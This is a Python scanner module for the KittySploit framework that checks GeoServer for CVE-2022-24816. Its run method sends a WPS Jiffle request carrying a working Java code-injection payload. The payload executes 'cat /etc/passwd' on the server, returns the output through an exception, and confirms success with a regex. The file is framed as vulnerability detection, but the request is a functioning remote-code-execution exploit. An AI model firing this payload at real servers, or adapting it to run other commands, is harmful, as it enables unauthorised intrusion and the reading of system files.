#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Programs run on GeoServer before 1."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'GeoServer <1.2.2 - Remote Code Execution Detection',
        'description': 'Programs run on GeoServer before 1.2.2 which use jt-jiffle and allow Jiffle script to be provided via network request are susceptible to remote code execution. The Jiffle script is compiled into Java code via Janino, and executed. In particular, this affects downstream GeoServer 1.1.22.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'geoserver', 'rce', 'geosolutionsgroup', 'kev', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.synacktiv.com/en/publications/exploiting-cve-2022-24816-a-code-injection-in-the-jt-jiffle-extension-of-geoserver.html',
            'https://github.com/geosolutions-it/jai-ext/security/advisories/GHSA-v92f-jx6p-73rx',
            'https://github.com/geosolutions-it/jai-ext/commit/cb1d6565d38954676b0a366da4f965fef38da1cb',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-24816',
            'https://github.com/tanjiti/sec_profile',
        ],
        'cve': 'CVE-2022-24816',
    }

    def run(self):
        path = '/geoserver/wms'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/xml'}, data='<?xml version="1.0" encoding="UTF-8"?>\n  <wps:Execute version="1.0.0" service="WPS" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://www.opengis.net/wps/1.0.0" xmlns:wfs="http://www.opengis.net/wfs" xmlns:wps="http://www.opengis.net/wps/1.0.0" xmlns:ows="http://www.opengis.net/ows/1.1" xmlns:gml="http://www.opengis.net/gml" xmlns:ogc="http://www.opengis.net/ogc" xmlns:wcs="http://www.opengis.net/wcs/1.1.1" xmlns:xlink="http://www.w3.org/1999/xlink" xsi:schemaLocation="http://www.opengis.net/wps/1.0.0 http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd">\n    <ows:Identifier>ras:Jiffle</ows:Identifier>\n    <wps:DataInputs>\n      <wps:Input>\n        <ows:Identifier>coverage</ows:Identifier>\n        <wps:Data>\n          <wps:ComplexData mimeType="application/arcgrid"><![CDATA[ncols 720 nrows 360 xllcorner -180 yllcorner -90 cellsize 0.5 NODATA_value -9999  316]]></wps:ComplexData>\n        </wps:Data>\n      </wps:Input>\n      <wps:Input>\n        <ows:Identifier>script</ows:Identifier>\n        <wps:Data>\n          <wps:LiteralData>dest = y() - (500); // */ public class Double {    public static double NaN = 0;  static { try {  java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(java.lang.Runtime.getRuntime().exec("cat /etc/passwd").getInputStream())); String line = null; String allLines = " - "; while ((line = reader.readLine()) != null) { allLines += line; } throw new RuntimeException(allLines);} catch (java.io.IOException e) {} }} /**</wps:LiteralData>\n        </wps:Data>\n      </wps:Input>\n      <wps:Input>\n        <ows:Identifier>outputType</ows:Identifier>\n        <wps:Data>\n          <wps:LiteralData>DOUBLE</wps:LiteralData>\n        </wps:Data>\n      </wps:Input>\n    </wps:DataInputs>\n    <wps:ResponseForm>\n      <wps:RawDataOutput mimeType="image/tiff">\n        <ows:Identifier>result</ows:Identifier>\n      </wps:RawDataOutput>\n    </wps:ResponseForm>\n  </wps:Execute>\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:', 'ExceptionInInitializerError',)
        if any(re.search(rx, body) for rx in body_regexes):
            self.set_info(severity='critical', reason='GeoServer <1.2.2 - Remote Code Execution detected', path=path)
            return True
        return False

